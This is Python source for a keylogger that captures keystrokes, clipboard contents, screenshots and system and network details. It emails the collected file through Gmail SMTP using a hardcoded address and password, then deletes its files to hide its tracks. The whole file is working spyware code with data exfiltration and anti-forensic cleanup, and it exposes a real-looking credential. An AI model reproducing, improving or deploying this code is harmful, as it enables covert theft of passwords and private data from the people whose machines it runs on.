# Libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import sounddevice as sd
from scipy.io.wavfile import write
import win32clipboard
import pyscreenshot as ImageGrab
from pynput.keyboard import Key, Listener
import time
import os

# Start up instances of files and paths
system_information = "system.txt"
audio_information = "audio.wav"
clipboard_information = "clipboard.txt"
screenshot_information = "screenshot.png"
keys_information = "key_log.txt"
extend = "\\"

file_path =  r"C:\Users\Mustafa Bolat\Desktop\keylogger"

# Time Controls
time_iteration = 15 # 7200 # 2 hours
number_of_iterations_end = 2 # 5000
microphone_time = 10 # 600 is 10 minutes


# Email Controls
email_address = "mustimmb566@gmail.com"
password = ""

# Get Computer and Network Information
def computer_information():
    with open(file_path + extend+ system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)

        f.write("Processor: " + (platform.processor() + "\n"))
        f.write("System: " + platform.system() + " " + platform.version() + "\n")
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("IP Address (IPv4 Address): " + IPAddr + "\n")

def send_file_to_mail():
    fromaddr = "mustimmb566@gmail.com"
    toaddr = "mustimmb566@gmail.com"
    
    # instance of MIMEMultipart 
    msg = MIMEMultipart() 
    
    # storing the senders email address   
    msg['From'] = fromaddr 
    
    # storing the receivers email address  
    msg['To'] = toaddr 
    
    # storing the subject  
    msg['Subject'] = "Subject of the Mail"
    
    # string to store the body of the mail 
    body = "Body_of_the_mail"
    
    # attach the body with the msg instance 
    msg.attach(MIMEText(body, 'plain')) 
    
    # open the file to be sent  
    filename = "system.txt"
    attachment = open(r"C:\Users\Mustafa Bolat\Desktop\keylogger\system.txt", "rb") 
    
    # instance of MIMEBase and named as p 
    p = MIMEBase('application', 'octet-stream') 
    
    # To change the payload into encoded form 
    p.set_payload((attachment).read()) 
    
    # encode into base64 
    encoders.encode_base64(p) 
    
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename) 
    
    # attach the instance 'p' to instance 'msg' 
    msg.attach(p) 
    
    # creates SMTP session 
    s = smtplib.SMTP('smtp.gmail.com', 587) 
    
    # start TLS for security 
    s.starttls() 
    
    # Authentication 
    s.login(fromaddr, "gtywqgtungvgttgz") 
    
    # Converts the Multipart msg into a string 
    text = msg.as_string() 
    
    # sending the mail 
    s.sendmail(fromaddr, toaddr, text) 
    
    # terminating the session 
    s.quit() 

computer_information()

# execute the fuction to send the files to the mail
send_file_to_mail()

# Gather clipboard contents
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could not be copied.")

# Screenshot functionalities
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

# Time controls for keylogger
number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration


while number_of_iterations < number_of_iterations_end:

    count = 0
    keys = []

    counter = 0

    def on_press(key):
        global keys, count, currentTime

        # print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []


    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'","")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False


    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

time.sleep(10) # Sleep two minutes before we delete all files

# Delete files - clean up our tracks
delete_files = [system_information, keys_information]
for file in delete_files:
    os.remove(file_path + extend + file)
